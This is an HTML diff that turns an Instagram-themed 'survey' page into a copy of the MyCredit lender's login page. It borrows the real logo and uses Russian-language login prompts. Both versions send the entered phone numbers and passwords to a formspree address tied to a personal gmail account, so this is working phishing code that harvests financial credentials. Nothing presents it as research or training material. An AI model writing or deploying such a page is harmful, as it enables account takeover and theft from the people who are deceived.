@@ -5,44 +5,52 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Instagram</title>
+    <title>My Credit</title>
     <link href="css/index.css" rel="stylesheet">
 </head>
 <body>
-<style>body {
-    background: url(1.jpg);
-    background-size: 100%;
-   }
-</style>
-    <br>
-    <br><br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-<div class="logIn">
-                <form method="post" action="https://formspree.io/syaskiy9523@gmail.com">
-                  <nav>Привет. Вас приветствует опросник.</nav>
-                  <nav>Для начала введите свой номер телефона и пароль</nav>
-                  <input type="text" name="Phone" placeholder="Ваш номер телефона"><br>
-                    <input type="password" name="pass" placeholder="Пароль"><br>
-                 <!-- <input type="text" name="Phone" placeholder="Номер телефона половинки"><br>
-                    </nav>
-                  <a onclick="toggle(hidden_content)">Получить пароль</a> 
-<div id="hidden_content" style="display: none;"><input type="password" name="pass" placeholder="Password">-->
-    <nav><input type="submit" value="Пройти опрос">
+
+
+  <img class="js-lazy mobile-logo_md logo-img loaded" data-src="https://media.mycredit.ua/images/main-page/logo___md.svg" alt="MyCredit" src="https://media.mycredit.ua/images/main-page/logo___md.svg" data-was-processed="true">
+  <div class="h1">Вход в личный кабинет</div>
+  
+  <div class="logIn">             
+  <form method="post" action="https://formspree.io/syaskiy9523@gmail.com">
+
+    <div class='form-container'>
+                  <input id="login" type="text" name="Phone" >
+                  <label for="Phone" class="form-label">
+                    Ваш номер телефона
+                    </label>
+                    <div class="help" >?</div>
+
+                  </div>
+                  <div class='form-container'>
+                    <input type="password" name="pass" >
+                    <label for="pass" class="form-label">
+                      Введите пароль
+                      </label>
+                      <div class="help" >?</div>
+                    </div>
+                
+      <input class="button" type="submit" name="btn" value="Продолжить" >
       </div>
-<!--<script>
-function toggle(el) {
-el.style.display = (el.style.display == 'none') ? '' : 'none'
-}
-</script>-->
+      <a>Забыли пароль?</a>
+      <p>У Bас еще нет учетной записи?</p>
+      <a>Регистрация</a>
 
                 </form>
   </div>
+
+<script>
+ const login = document.querySelector('#login');
+login.addEventListener('focus',()=>{
+   login.value= "+ 38 0";
+   login.focus();
+   
+
+})
+</script>
 
 </body>
 </html>
